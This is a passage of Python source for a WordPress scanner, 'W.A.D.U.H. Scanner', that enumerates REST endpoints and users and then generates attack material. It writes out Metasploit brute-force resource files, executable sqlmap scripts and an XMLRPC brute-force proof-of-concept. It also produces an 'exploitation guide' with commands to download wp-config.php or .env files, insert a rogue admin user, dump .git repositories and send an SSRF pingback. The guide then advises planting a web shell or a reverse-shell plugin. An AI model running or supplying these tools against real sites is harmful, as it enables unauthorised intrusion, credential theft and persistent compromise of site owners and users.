        # Test 2: Check for pingback functionality
        if self.deep_scan:
            self.log("    Testing pingback functionality...", Fore.YELLOW, "debug")
            pingback_data = """<?xml version="1.0"?>
            <methodCall>
                <methodName>pingback.ping</methodName>
                <params>
                    <param><value><string>http://example.com/test</string></value></param>
                    <param><value><string>{}</string></value></param>
                </params>
            </methodCall>""".format(self.target_url)

            r = self.make_request(xmlrpc_url, method="POST", data=pingback_data, timeout=(5, 10))
            if r and "faultCode" not in r.text:
                self.log("    [!] Pingback may be exploitable for SSRF/DDoS", Fore.RED)

    # ---------------- REST API CLASSIFICATION ----------------

    @staticmethod
    def classify_namespace(namespace: str, route: str) -> Tuple[str, str]:
        """Classify endpoint namespace into category + plugin name"""
        if not namespace:
            namespace = ""

        ns = namespace.lower()

        # Core WP
        if ns.startswith("wp/"):
            return "Core", "WordPress Core"

        # Known plugins
        known_plugins = {
            "wc/": "WooCommerce",
            "woocommerce": "WooCommerce",
            "yoast": "Yoast SEO",
            "jetpack": "Jetpack",
            "akismet": "Akismet",
            "contact-form-7": "Contact Form 7",
            "cf7": "Contact Form 7",
            "gf/": "Gravity Forms",
            "gravityforms": "Gravity Forms",
            "wordfence": "Wordfence",
            "rankmath": "Rank Math SEO",
            "elementor": "Elementor",
            "polylang": "Polylang",
            "wpml": "WPML",
        }

        for key, name in known_plugins.items():
            if key in ns:
                return "Plugin", name

        # Theme-ish heuristics
        if "/theme" in route or "/themes" in route:
            return "Theme", "Theme-related"

        return "Custom", "Custom/Unknown"

    @staticmethod
    def detect_user_enum(route: str) -> bool:
        """Heuristic to flag potential user enumeration endpoints"""
        lowered = route.lower()
        risky_keywords = [
            "/wp/v2/users",
            "/users",
            "/customers",
            "/members",
            "/subscribers",
        ]
        return any(kw in lowered for kw in risky_keywords)

    @staticmethod
    def is_write_capable(methods: List[str]) -> bool:
        """Check if any HTTP method is write-capable"""
        write_methods = {"POST", "PUT", "PATCH", "DELETE"}
        return any(m.upper() in write_methods for m in methods)

    def build_endpoints_index(self) -> None:
        """Parse API data and build endpoints info + summary"""
        routes = self.api_data.get('routes', {})
        namespaces = self.api_data.get('namespaces', [])

        endpoints_info = []

        for route, details in routes.items():
            methods = []
            namespace = details.get('namespace', '')

            # Extract methods
            if 'endpoints' in details:
                for ep in details['endpoints']:
                    ep_methods = ep.get('methods', [])
                    if isinstance(ep_methods, list):
                        methods.extend(ep_methods)
                    elif isinstance(ep_methods, str):
                        methods.append(ep_methods)

            methods = sorted(list(set(m.upper() for m in methods)))

            category, plugin_name = self.classify_namespace(namespace, route)
            is_user_enum = self.detect_user_enum(route)
            is_write = self.is_write_capable(methods)

            endpoints_info.append({
                "route": route,
                "methods": methods,
                "namespace": namespace,
                "category": category,
                "plugin_name": plugin_name,
                "is_user_enum": is_user_enum,
                "is_write": is_write,
            })

        # Build summary
        total_routes = len(endpoints_info)
        method_counts = {}
        writeable_count = 0
        user_enum_count = 0
        category_counts = {}

        for ep in endpoints_info:
            for m in ep['methods']:
                method_counts[m] = method_counts.get(m, 0) + 1

            if ep['is_write']:
                writeable_count += 1
            if ep['is_user_enum']:
                user_enum_count += 1

            cat = ep['category']
            category_counts[cat] = category_counts.get(cat, 0) + 1

        self.endpoints_info = endpoints_info
        self.summary = {
            "total_routes": total_routes,
            "method_counts": method_counts,
            "writeable_count": writeable_count,
            "user_enum_count": user_enum_count,
            "category_counts": category_counts,
            "namespaces": namespaces,
        }

    def export_endpoints(self) -> None:
        """Export endpoints and summary to JSON & TXT"""
        if not self.endpoints_info:
            return

        parsed = urlparse(self.target_url)
        host = parsed.netloc or "target"
        host_safe = host.replace(":", "_").replace("/", "_")

        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        # Create output directory if specified
        output_path = self.output_dir if self.output_dir else "."
        if self.output_dir and not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

        json_filename = os.path.join(output_path, f"waduh_{host_safe}_endpoints_{timestamp}.json")
        txt_filename = os.path.join(output_path, f"waduh_{host_safe}_endpoints_{timestamp}.txt")

        export_data = {
            "target": self.target_url,
            "generated_utc": timestamp,
            "summary": self.summary,
            "endpoints": self.endpoints_info,
        }

        try:
            with open(json_filename, "w", encoding="utf-8") as f:
                json.dump(export_data, f, indent=2)
            self.log(f"[+] Exported JSON report: {json_filename}", Fore.GREEN)
        except Exception as e:
            self.log(f"[!] Failed to write JSON export to {json_filename}: {e}", Fore.RED)

        try:
            with open(txt_filename, "w", encoding="utf-8") as f:
                f.write(f"W.A.D.U.H. REST API Report for {self.target_url}\n")
                f.write(f"Generated (UTC): {timestamp}\n\n")
                f.write("=== SUMMARY ===\n")
                f.write(f"Total routes: {self.summary.get('total_routes', 0)}\n")
                f.write(f"Category counts: {self.summary.get('category_counts', {})}\n")
                f.write(f"Method counts: {self.summary.get('method_counts', {})}\n")
                f.write(f"Write-capable endpoints: {self.summary.get('writeable_count', 0)}\n")
                f.write(f"Potential user-enum endpoints: {self.summary.get('user_enum_count', 0)}\n")
                f.write("\n=== ENDPOINTS ===\n")

                for ep in sorted(self.endpoints_info, key=lambda x: x['route']):
                    line = (
                        f"{ep['route']} | Methods: {ep['methods']} | "
                        f"Namespace: {ep['namespace']} | Category: {ep['category']} | "
                        f"Plugin: {ep['plugin_name']} | UserEnum: {ep['is_user_enum']} | "
                        f"Write: {ep['is_write']}\n"
                    )
                    f.write(line)

            self.log(f"[+] Exported TXT report: {txt_filename}", Fore.GREEN)
        except Exception as e:
            self.log(f"[!] Failed to write TXT export to {txt_filename}: {e}", Fore.RED)

    def print_rest_summary(self) -> None:
        """Print human-friendly REST API summary"""
        if not self.summary:
            return

        self.log("\n[*] REST API Summary:", Fore.MAGENTA)
        self.log(f"    Total routes: {self.summary['total_routes']}")

        cat_counts = self.summary.get('category_counts', {})
        if cat_counts:
            self.log("    By category:")
            for cat, count in cat_counts.items():
                self.log(f"      - {cat}: {count}")

        method_counts = self.summary.get('method_counts', {})
        if method_counts:
            self.log("    HTTP methods distribution:")
            for m, count in sorted(method_counts.items()):
                self.log(f"      - {m}: {count}")

        self.log(
            f"    Write-capable endpoints: {self.summary['writeable_count']} "
            f"(POST/PUT/PATCH/DELETE)"
        )
        self.log(
            f"    Potential user-enum endpoints: {self.summary['user_enum_count']}"
        )

        namespaces = self.summary.get('namespaces', [])
        if namespaces:
            self.log("    Namespaces detected:")
            for ns in namespaces:
                self.log(f"      - {ns}")

    # ---------------- REST API ANALYSIS ----------------

    def analyze_rest_api(self) -> None:
        """Analyze /wp-json for exposed endpoints"""
        self.log("\n[*] Starting REST API Analysis (/wp-json)...", Fore.BLUE)
        api_url = f"{self.target_url}/wp-json"

        r = self.make_request(api_url, timeout=(5, 20))

        if not r:
            self.log("[!] Failed to contact REST API", Fore.RED)
            return

        if r.status_code == 200:
            self.log("[+] REST API is Exposed (Status 200 OK)", Fore.GREEN)
            try:
                self.api_data = r.json()
            except json.JSONDecodeError:
                self.log(
                    "[!] Response was 200 OK but not valid JSON. (Likely HTML/WAF page)",
                    Fore.RED
                )
                return

            # Basic Info
            name = self.api_data.get('name', 'Unknown')
            desc = self.api_data.get('description', 'Unknown')
            self.log(f"    Site Name: {name}")
            self.log(f"    Description: {desc}")

            # Build index & summary
            self.build_endpoints_index()

            self.log(
                f"\n[*] Listing ALL Available Endpoints ({len(self.endpoints_info)} found):",
                Fore.MAGENTA
            )

            # Group by category
            groups = {"Core": [], "Plugin": [], "Theme": [], "Custom": []}
            for ep in self.endpoints_info:
                groups[ep['category']].append(ep)

            for category in ["Core", "Plugin", "Theme", "Custom"]:
                eps = groups.get(category, [])
                if not eps:
                    continue

                self.log(f"\n  == {category} Endpoints ({len(eps)}) ==", Fore.YELLOW)

                for ep in sorted(eps, key=lambda x: x['route']):
                    prefix = ""
                    color = Fore.CYAN

                    if ep['is_user_enum']:
                        prefix += "[USER-ENUM] "
                        color = Fore.RED
                    if ep['is_write']:
                        prefix += "[WRITE] "
                        color = Fore.RED

                    if category == "Plugin" and ep['plugin_name']:
                        prefix += f"[{ep['plugin_name']}] "

                    line = (
                        f"    {prefix}Path: {ep['route']} | "
                        f"Methods: {ep['methods']} | "
                        f"NS: {ep['namespace']}"
                    )
                    self.log(line, color, "debug" if not (ep['is_user_enum'] or ep['is_write']) else "info")

            self.print_rest_summary()
            self.export_endpoints()
            self.log("\n[!] REST API Analysis Complete.", Fore.YELLOW)

        elif r.status_code in [401, 403]:
            self.log("[+] REST API is Protected (403/401). This is secure.", Fore.GREEN)

        elif r.status_code == 404:
            self.log("[-] REST API not found (404). It might be disabled.", Fore.YELLOW)

        else:
            self.log(f"[-] Non-standard response: {r.status_code}", Fore.YELLOW)

    # ---------------- FINAL SUMMARY REPORT ----------------

    def generate_final_report(self) -> None:
        """Generate comprehensive final report"""
        self.log("\n" + "="*60, Fore.CYAN + Style.BRIGHT)
        self.log("                    FINAL SECURITY REPORT", Fore.CYAN + Style.BRIGHT)
        self.log("="*60 + "\n", Fore.CYAN + Style.BRIGHT)

        # Vulnerabilities
        if self.vulnerabilities:
            self.log(f"[!] VULNERABILITIES FOUND: {len(self.vulnerabilities)}", Fore.RED + Style.BRIGHT)

            # Group by severity
            critical = [v for v in self.vulnerabilities if v['severity'] == 'critical']
            high = [v for v in self.vulnerabilities if v['severity'] == 'high']
            medium = [v for v in self.vulnerabilities if v['severity'] == 'medium']
            low = [v for v in self.vulnerabilities if v['severity'] == 'low']

            if critical:
                self.log(f"\n  CRITICAL ({len(critical)}):", Fore.RED + Style.BRIGHT)
                for v in critical:
                    self.log(f"    - {v['title']}: {v['description']}", Fore.RED)

            if high:
                self.log(f"\n  HIGH ({len(high)}):", Fore.RED)
                for v in high:
                    self.log(f"    - {v['title']}: {v['description']}", Fore.RED)

            if medium:
                self.log(f"\n  MEDIUM ({len(medium)}):", Fore.YELLOW)
                for v in medium:
                    self.log(f"    - {v['title']}", Fore.YELLOW)

            if low:
                self.log(f"\n  LOW ({len(low)}):", Fore.CYAN)
                for v in low:
                    self.log(f"    - {v['title']}", Fore.CYAN)
        else:
            self.log("[+] No vulnerabilities found", Fore.GREEN)

        # Information Leaks
        if self.info_leaks:
            self.log(f"\n[!] INFORMATION LEAKS: {len(self.info_leaks)}", Fore.YELLOW)
            for leak in self.info_leaks[:10]:  # Show first 10
                self.log(f"    - {leak['title']}", Fore.YELLOW)

        # Security Issues
        if self.security_issues:
            self.log(f"\n[!] SECURITY MISCONFIGURATIONS: {len(self.security_issues)}", Fore.YELLOW)
            for issue in self.security_issues[:10]:  # Show first 10
                self.log(f"    - {issue['title']}", Fore.YELLOW)

        # Export full report
        self.export_full_report()

        # Export exploitation files
        self.export_exploitation_guide()
        self.export_metasploit_rc()
        self.export_sqlmap_commands()
        self.generate_poc_scripts()

        self.log("\n" + "="*60, Fore.CYAN + Style.BRIGHT)
        self.log("                    SCAN COMPLETE", Fore.GREEN + Style.BRIGHT)
        self.log("="*60 + "\n", Fore.CYAN + Style.BRIGHT)

    def export_full_report(self) -> None:
        """Export comprehensive JSON report with all findings"""
        parsed = urlparse(self.target_url)
        host = parsed.netloc or "target"
        host_safe = host.replace(":", "_").replace("/", "_")

        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        output_path = self.output_dir if self.output_dir else "."
        if self.output_dir and not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

        report_filename = os.path.join(output_path, f"waduh_{host_safe}_full_report_{timestamp}.json")

        report_data = {
            "target": self.target_url,
            "scan_date": timestamp,
            "wordpress_version": self.wp_version,
            "vulnerabilities": self.vulnerabilities,
            "information_leaks": self.info_leaks,
            "security_issues": self.security_issues,
            "statistics": {
                "total_vulnerabilities": len(self.vulnerabilities),
                "critical": len([v for v in self.vulnerabilities if v['severity'] == 'critical']),
                "high": len([v for v in self.vulnerabilities if v['severity'] == 'high']),
                "medium": len([v for v in self.vulnerabilities if v['severity'] == 'medium']),
                "low": len([v for v in self.vulnerabilities if v['severity'] == 'low']),
                "info_leaks": len(self.info_leaks),
                "security_issues": len(self.security_issues),
            }
        }

        try:
            with open(report_filename, "w", encoding="utf-8") as f:
                json.dump(report_data, f, indent=2)
            self.log(f"[+] Full security report exported: {report_filename}", Fore.GREEN)
        except Exception as e:
            self.log(f"[!] Failed to write full report to {report_filename}: {e}", Fore.RED)

    # ---------------- EXPLOITATION EXPORTS ----------------

    def export_metasploit_rc(self) -> None:
        """Export findings to Metasploit resource file format"""
        if not self.export_metasploit:
            return

        parsed = urlparse(self.target_url)
        host = parsed.netloc or "target"
        host_safe = host.replace(":", "_").replace("/", "_")
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        output_path = self.output_dir if self.output_dir else "."
        if self.output_dir and not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

        rc_filename = os.path.join(output_path, f"waduh_{host_safe}_metasploit_{timestamp}.rc")

        try:
            with open(rc_filename, "w", encoding="utf-8") as f:
                f.write("# W.A.D.U.H. Scanner - Metasploit Resource File\n")
                f.write(f"# Target: {self.target_url}\n")
                f.write(f"# Generated: {timestamp}\n")
                f.write("# AUTHORIZED USE ONLY\n\n")

                # XMLRPC Brute Force
                if self.xmlrpc_enabled and self.found_users:
                    f.write("# ============================================================\n")
                    f.write("# XMLRPC Brute Force Attack\n")
                    f.write("# ============================================================\n")
                    f.write("use auxiliary/scanner/http/wordpress_xmlrpc_login\n")
                    f.write(f"set RHOSTS {parsed.hostname}\n")
                    if parsed.port:
                        f.write(f"set RPORT {parsed.port}\n")
                    f.write(f"set TARGETURI {parsed.path or '/'}\n")
                    f.write(f"set USERNAME {self.found_users[0]}\n")
                    f.write("set PASS_FILE /usr/share/wordlists/rockyou.txt\n")
                    f.write("set STOP_ON_SUCCESS true\n")
                    f.write("set VERBOSE true\n")
                    f.write("run\n\n")

                    # Multi-user attack
                    if len(self.found_users) > 1:
                        f.write("# Multiple users found - create user list\n")
                        f.write(f"# Users: {', '.join(self.found_users)}\n")
                        userlist_file = os.path.join(output_path, f"waduh_{host_safe}_users_{timestamp}.txt")
                        with open(userlist_file, "w") as uf:
                            for user in self.found_users:
                                uf.write(f"{user}\n")
                        f.write(f"# User list saved to: {userlist_file}\n")
                        f.write("# set USER_FILE " + userlist_file + "\n\n")

                # WP Login Brute Force
                if self.found_users:
                    f.write("# ============================================================\n")
                    f.write("# WordPress Login Brute Force\n")
                    f.write("# ============================================================\n")
                    f.write("use auxiliary/scanner/http/wordpress_login_enum\n")
                    f.write(f"set RHOSTS {parsed.hostname}\n")
                    if parsed.port:
                        f.write(f"set RPORT {parsed.port}\n")
                    f.write(f"set TARGETURI {parsed.path or '/'}\n")
                    f.write(f"set USERNAME {self.found_users[0]}\n")
                    f.write("set PASS_FILE /usr/share/wordlists/rockyou.txt\n")
                    f.write("set STOP_ON_SUCCESS true\n")
                    f.write("run\n\n")

                # Plugin vulnerability checks
                if self.detected_plugins:
                    f.write("# ============================================================\n")
                    f.write("# Plugin Vulnerability Checks\n")
                    f.write("# ============================================================\n")
                    f.write(f"# Detected plugins: {', '.join([p['slug'] for p in self.detected_plugins])}\n")
                    f.write("# Search for exploits with: search wordpress [plugin_name]\n")
                    f.write("# Example: search wordpress contact-form-7\n\n")

                f.write("# ============================================================\n")
                f.write("# Manual Steps:\n")
                f.write("# 1. Load this file: msfconsole -r " + rc_filename + "\n")
                f.write("# 2. Monitor output for successful authentication\n")
                f.write("# 3. Use valid credentials for post-exploitation\n")
                f.write("# ============================================================\n")

            self.log(f"[+] Metasploit resource file exported: {rc_filename}", Fore.GREEN)
        except Exception as e:
            self.log(f"[!] Failed to write Metasploit file: {e}", Fore.RED)

    def export_sqlmap_commands(self) -> None:
        """Export SQLMap commands for SQL injection testing"""
        if not self.export_sqlmap:
            return

        parsed = urlparse(self.target_url)
        host = parsed.netloc or "target"
        host_safe = host.replace(":", "_").replace("/", "_")
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        output_path = self.output_dir if self.output_dir else "."
        if self.output_dir and not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

        sqlmap_filename = os.path.join(output_path, f"waduh_{host_safe}_sqlmap_{timestamp}.sh")

        try:
            with open(sqlmap_filename, "w", encoding="utf-8") as f:
                f.write("#!/bin/bash\n")
                f.write("# W.A.D.U.H. Scanner - SQLMap Command Script\n")
                f.write(f"# Target: {self.target_url}\n")
                f.write(f"# Generated: {timestamp}\n")
                f.write("# AUTHORIZED USE ONLY\n\n")

                if self.sql_injection_params:
                    f.write("# ============================================================\n")
                    f.write("# SQL Injection Testing (Database errors detected)\n")
                    f.write("# ============================================================\n\n")

                    for param in self.sql_injection_params:
                        url = f"{self.target_url}/{param}"
                        f.write(f"# Test parameter: {param}\n")
                        f.write(f"sqlmap -u \"{url}\" \\\n")
                        f.write("  --batch \\\n")
                        f.write("  --random-agent \\\n")
                        f.write("  --level=2 \\\n")
                        f.write("  --risk=2 \\\n")
                        f.write("  --technique=BEUST \\\n")
                        f.write("  --threads=5 \\\n")
                        f.write("  --dbs\n\n")
                else:
                    f.write("# No SQL injection points detected during scan\n")
                    f.write("# Try manual testing on search forms and URL parameters\n\n")

                # Generic WordPress SQL injection tests
                f.write("# ============================================================\n")
                f.write("# Generic WordPress SQL Injection Tests\n")
                f.write("# ============================================================\n\n")

                f.write("# Test search parameter\n")
                f.write(f"sqlmap -u \"{self.target_url}/?s=test\" \\\n")
                f.write("  --batch \\\n")
                f.write("  --random-agent \\\n")
                f.write("  --level=2 \\\n")
                f.write("  --risk=2\n\n")

                f.write("# Test category parameter\n")
                f.write(f"sqlmap -u \"{self.target_url}/?cat=1\" \\\n")
                f.write("  --batch \\\n")
                f.write("  --random-agent \\\n")
                f.write("  --level=2 \\\n")
                f.write("  --risk=2\n\n")

                f.write("# Test post ID parameter\n")
                f.write(f"sqlmap -u \"{self.target_url}/?p=1\" \\\n")
                f.write("  --batch \\\n")
                f.write("  --random-agent \\\n")
                f.write("  --level=2 \\\n")
                f.write("  --risk=2\n\n")

                # REST API testing
                f.write("# ============================================================\n")
                f.write("# REST API SQL Injection Tests\n")
                f.write("# ============================================================\n\n")
                f.write(f"sqlmap -u \"{self.target_url}/wp-json/wp/v2/posts?per_page=1\" \\\n")
                f.write("  --batch \\\n")
                f.write("  --random-agent \\\n")
                f.write("  --level=3 \\\n")
                f.write("  --risk=2\n\n")

                f.write("# Make executable: chmod +x " + sqlmap_filename + "\n")

            # Make the script executable on Unix-like systems
            try:
                os.chmod(sqlmap_filename, 0o755)
            except:
                pass

            self.log(f"[+] SQLMap commands exported: {sqlmap_filename}", Fore.GREEN)
        except Exception as e:
            self.log(f"[!] Failed to write SQLMap file: {e}", Fore.RED)

    def export_exploitation_guide(self) -> None:
        """Export detailed step-by-step exploitation instructions"""
        parsed = urlparse(self.target_url)
        host = parsed.netloc or "target"
        host_safe = host.replace(":", "_").replace("/", "_")
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        output_path = self.output_dir if self.output_dir else "."
        if self.output_dir and not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

        guide_filename = os.path.join(output_path, f"waduh_{host_safe}_exploitation_guide_{timestamp}.md")

        try:
            with open(guide_filename, "w", encoding="utf-8") as f:
                f.write("# WordPress Exploitation Guide\n\n")
                f.write(f"**Target:** {self.target_url}\n\n")
                f.write(f"**Generated:** {timestamp}\n\n")
                f.write(f"**WordPress Version:** {self.wp_version or 'Unknown'}\n\n")
                f.write("**⚠️ AUTHORIZED USE ONLY**\n\n")
                f.write("---\n\n")

                # Table of contents
                f.write("## Table of Contents\n\n")
                f.write("1. [Executive Summary](#executive-summary)\n")
                f.write("2. [Reconnaissance Data](#reconnaissance-data)\n")
                f.write("3. [Exploitation Paths](#exploitation-paths)\n")
                f.write("4. [Command Reference](#command-reference)\n")
                f.write("5. [Post-Exploitation](#post-exploitation)\n\n")
                f.write("---\n\n")

                # Executive Summary
                f.write("## Executive Summary\n\n")
                critical_count = len([v for v in self.vulnerabilities if v['severity'] == 'critical'])
                high_count = len([v for v in self.vulnerabilities if v['severity'] == 'high'])
                f.write(f"- **Critical Vulnerabilities:** {critical_count}\n")
                f.write(f"- **High Vulnerabilities:** {high_count}\n")
                f.write(f"- **Enumerated Users:** {len(self.found_users)}\n")
                f.write(f"- **Detected Plugins:** {len(self.detected_plugins)}\n")
                f.write(f"- **XMLRPC Enabled:** {'Yes' if self.xmlrpc_enabled else 'No'}\n\n")

                # Reconnaissance Data
                f.write("## Reconnaissance Data\n\n")

                if self.found_users:
                    f.write("### Enumerated Usernames\n\n")
                    f.write("```\n")
                    for user in self.found_users:
                        f.write(f"{user}\n")
                    f.write("```\n\n")
                    f.write("**Attack Vector:** Use these for brute force attacks on wp-login.php or XMLRPC\n\n")

                if self.detected_plugins:
                    f.write("### Detected Plugins\n\n")
                    f.write("| Plugin | Version |\n")
                    f.write("|--------|--------|\n")
                    for plugin in self.detected_plugins:
                        version = plugin.get('version') or 'Unknown'
                        f.write(f"| {plugin['slug']} | {version} |\n")
                    f.write("\n**Attack Vector:** Search for CVEs and Metasploit modules for each plugin\n\n")

                if self.detected_themes:
                    f.write("### Detected Themes\n\n")
                    f.write("| Theme | Version |\n")
                    f.write("|-------|--------|\n")
                    for theme in self.detected_themes:
                        version = theme.get('version') or 'Unknown'
                        f.write(f"| {theme['slug']} | {version} |\n")
                    f.write("\n")

                # Exploitation Paths
                f.write("## Exploitation Paths\n\n")

                # Critical vulnerabilities first
                critical_vulns = [v for v in self.vulnerabilities if v['severity'] == 'critical']
                if critical_vulns:
                    f.write("### 🔴 CRITICAL - Immediate Exploitation Paths\n\n")
                    for i, vuln in enumerate(critical_vulns, 1):
                        f.write(f"#### {i}. {vuln['title']}\n\n")
                        f.write(f"**Description:** {vuln['description']}\n\n")

                        # Specific exploitation steps based on vulnerability type
                        if "wp-config" in vuln['title'].lower() or ".env" in vuln['title'].lower():
                            f.write("**Exploitation Steps:**\n\n")
                            f.write("1. Download the exposed configuration file:\n")
                            f.write("   ```bash\n")
                            if "wp-config" in vuln['title'].lower():
                                f.write(f"   wget {self.target_url}/wp-config.php\n")
                            else:
                                f.write(f"   wget {self.target_url}/.env\n")
                            f.write("   ```\n\n")
                            f.write("2. Extract database credentials from the file\n")
                            f.write("3. Connect to database remotely (if exposed):\n")
                            f.write("   ```bash\n")
                            f.write("   mysql -h [DB_HOST] -u [DB_USER] -p[DB_PASSWORD] [DB_NAME]\n")
                            f.write("   ```\n\n")
                            f.write("4. Create admin user via SQL injection:\n")
                            f.write("   ```sql\n")
                            f.write("   INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_status)\n")
                            f.write("   VALUES ('hacker', MD5('password123'), 'hacker', 'hacker@email.com', 0);\n")
                            f.write("   ```\n\n")

                        elif ".git" in vuln['title'].lower():
                            f.write("**Exploitation Steps:**\n\n")
                            f.write("1. Download Git repository using git-dumper:\n")
                            f.write("   ```bash\n")
                            f.write(f"   git-dumper {self.target_url}/.git ./git-dump\n")
                            f.write("   ```\n\n")
                            f.write("2. Search for credentials in the repository:\n")
                            f.write("   ```bash\n")
                            f.write("   cd git-dump\n")
                            f.write("   git log --all --full-history --source -- '*config*' '*password*' '*.env*'\n")
                            f.write("   grep -r 'password' .\n")
                            f.write("   ```\n\n")

                # XMLRPC exploitation
                if self.xmlrpc_enabled:
                    f.write("### 🟡 XMLRPC-Based Attacks\n\n")
                    f.write("#### Brute Force via XMLRPC\n\n")
                    f.write("**Why:** XMLRPC allows testing multiple credentials in a single request\n\n")
                    f.write("**Exploitation:**\n\n")
                    if self.found_users:
                        f.write(f"1. Using found username: `{self.found_users[0]}`\n\n")
                    f.write("```bash\n")
                    f.write("# Using WPScan\n")
                    if self.found_users:
                        f.write(f"wpscan --url {self.target_url} --passwords /usr/share/wordlists/rockyou.txt --usernames {self.found_users[0]}\n\n")
                    f.write("# Using Python script\n")
                    f.write("python3 xmlrpc_brute.py " + self.target_url + "\n")
                    f.write("```\n\n")

                    if "pingback.ping" in self.dangerous_xmlrpc_methods:
                        f.write("#### SSRF via Pingback\n\n")
                        f.write("**Exploitation:**\n\n")
                        f.write("```bash\n")
                        f.write(f"curl -X POST {self.target_url}/xmlrpc.php \\\n")
                        f.write("  -d '<?xml version=\"1.0\"?>\n")
                        f.write("  <methodCall>\n")
                        f.write("    <methodName>pingback.ping</methodName>\n")
                        f.write("    <params>\n")
                        f.write("      <param><value><string>http://internal-server:8080/admin</string></value></param>\n")
                        f.write(f"      <param><value><string>{self.target_url}/test</string></value></param>\n")
                        f.write("    </params>\n")
                        f.write("  </methodCall>'\n")
                        f.write("```\n\n")

                # SQL Injection exploitation
                if self.sql_injection_params:
                    f.write("### 🟡 SQL Injection Exploitation\n\n")
                    f.write(f"**Vulnerable Parameters:** {', '.join(self.sql_injection_params)}\n\n")
                    f.write("**Exploitation:**\n\n")
                    f.write("```bash\n")
                    f.write(f"sqlmap -u \"{self.target_url}/{self.sql_injection_params[0]}\" \\\n")
                    f.write("  --batch \\\n")
                    f.write("  --level=3 \\\n")
                    f.write("  --risk=2 \\\n")
                    f.write("  --dbs \\\n")
                    f.write("  --dump\n")
                    f.write("```\n\n")

                # Command Reference
                f.write("## Command Reference\n\n")

                f.write("### WPScan\n\n")
                f.write("```bash\n")
                f.write(f"# Full enumeration\n")
                f.write(f"wpscan --url {self.target_url} --enumerate ap,at,u\n\n")
                if self.found_users:
                    f.write(f"# Brute force with found users\n")
                    f.write(f"wpscan --url {self.target_url} --passwords /usr/share/wordlists/rockyou.txt --usernames {','.join(self.found_users)}\n")
                f.write("```\n\n")

                f.write("### Metasploit\n\n")
                f.write("```bash\n")
                f.write("msfconsole\n")
                f.write("use auxiliary/scanner/http/wordpress_login_enum\n")
                f.write(f"set RHOSTS {parsed.hostname}\n")
                if self.found_users:
                    f.write(f"set USERNAME {self.found_users[0]}\n")
                f.write("set PASS_FILE /usr/share/wordlists/rockyou.txt\n")
                f.write("run\n")
                f.write("```\n\n")

                # Post-Exploitation
                f.write("## Post-Exploitation\n\n")
                f.write("After gaining admin access:\n\n")
                f.write("1. **Upload Web Shell via Theme Editor:**\n")
                f.write("   - Navigate to Appearance → Theme Editor\n")
                f.write("   - Edit 404.php or footer.php\n")
                f.write("   - Insert PHP web shell code\n\n")

                f.write("2. **Upload Malicious Plugin:**\n")
                f.write("   - Create plugin with reverse shell\n")
                f.write("   - Upload via Plugins → Add New\n")
                f.write("   - Activate plugin\n\n")

                f.write("3. **Database Access:**\n")
                f.write("   - Check wp-config.php for DB credentials\n")
                f.write("   - Access via phpMyAdmin or MySQL CLI\n")
                f.write("   - Dump password hashes\n\n")

                f.write("---\n\n")
                f.write("**Generated by W.A.D.U.H. Scanner v2.2**\n")

            self.log(f"[+] Exploitation guide exported: {guide_filename}", Fore.GREEN)
        except Exception as e:
            self.log(f"[!] Failed to write exploitation guide: {e}", Fore.RED)

    def generate_poc_scripts(self) -> None:
        """Generate proof-of-concept Python scripts for vulnerabilities"""
        if not self.generate_pocs:
            return

        parsed = urlparse(self.target_url)
        host = parsed.netloc or "target"
        host_safe = host.replace(":", "_").replace("/", "_")
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

        output_path = self.output_dir if self.output_dir else "."
        poc_dir = os.path.join(output_path, f"pocs_{host_safe}_{timestamp}")

        if not os.path.exists(poc_dir):
            os.makedirs(poc_dir)

        # Generate XMLRPC brute force PoC
        if self.xmlrpc_enabled and self.found_users:
            poc_filename = os.path.join(poc_dir, "xmlrpc_bruteforce.py")
            try:
                with open(poc_filename, "w", encoding="utf-8") as f:
                    f.write("#!/usr/bin/env python3\n")
                    f.write("\"\"\"\n")
                    f.write("WordPress XMLRPC Brute Force PoC\n")
                    f.write(f"Target: {self.target_url}\n")
                    f.write("AUTHORIZED USE ONLY\n")
                    f.write("\"\"\"\n\n")
                    f.write("import requests\n")
                    f.write("import sys\n\n")

                    f.write(f"TARGET = \"{self.target_url}/xmlrpc.php\"\n")
                    f.write(f"USERNAME = \"{self.found_users[0]}\"\n")
                    f.write("WORDLIST = \"passwords.txt\"  # Create this file with passwords\n\n")

                    f.write("def test_login(username, password):\n")
                    f.write("    payload = f\"\"\"\n")
                    f.write("    <?xml version=\"1.0\"?>\n")
                    f.write("    <methodCall>\n")
                    f.write("        <methodName>wp.getUsersBlogs</methodName>\n")
                    f.write("        <params>\n")
                    f.write("            <param><value><string>{username}</string></value></param>\n")
                    f.write("            <param><value><string>{password}</string></value></param>\n")
                    f.write("        </params>\n")
                    f.write("    </methodCall>\n")
                    f.write("    \"\"\"\n\n")

                    f.write("    try:\n")
                    f.write("        response = requests.post(TARGET, data=payload, timeout=10)\n")
                    f.write("        if \"isAdmin\" in response.text:\n")
                    f.write("            return True\n")
                    f.write("        elif \"403\" in response.text or \"Incorrect\" in response.text:\n")
                    f.write("            return False\n")
                    f.write("    except Exception as e:\n")
                    f.write("        print(f\"Error: {e}\")\n")
                    f.write("    return False\n\n")

                    f.write("def main():\n")
                    f.write("    print(f\"[*] Testing XMLRPC on {TARGET}\")\n")
                    f.write("    print(f\"[*] Username: {USERNAME}\")\n")
                    f.write("    print(f\"[*] Wordlist: {WORDLIST}\\n\")\n\n")

                    f.write("    try:\n")
                    f.write("        with open(WORDLIST, 'r') as f:\n")
                    f.write("            passwords = f.read().splitlines()\n")
                    f.write("    except FileNotFoundError:\n")
                    f.write("        print(f\"[-] Wordlist not found: {WORDLIST}\")\n")
                    f.write("        sys.exit(1)\n\n")

                    f.write("    for i, password in enumerate(passwords, 1):\n")
                    f.write("        print(f\"\\r[{i}/{len(passwords)}] Testing: {password[:20]}\", end='', flush=True)\n")
